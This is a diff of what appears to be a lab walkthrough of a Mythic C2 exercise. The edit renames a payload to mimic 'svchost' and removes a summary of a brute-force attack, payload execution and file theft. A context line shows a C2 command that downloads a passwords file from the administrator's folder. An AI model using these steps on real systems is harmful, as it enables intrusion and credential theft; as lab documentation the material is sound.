@@ -159,7 +159,7 @@ Command:
    
 Copy the download link address from Mythic web GUI.
 Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
-Rename the downloaded file to `servicehost-wahab.exe`.
+Rename the downloaded file to `svchost-wahab.exe`.
 
 **2. Serve Payload via HTTP**:
    
@@ -241,11 +241,4 @@ download C:\Users\Administrator\Documents\passwords.txt
 Check the downloaded file in Mythic web GUI.
 Confirm the contents of the file.
 
-## 12. Conclusion
-
-**Summary**:
-
-Successfully performed a Brute Force attack and established a C2 session.
-Downloaded and executed a payload on the Windows server.
-Retrieved a fake password file using the established C2 connection.
 
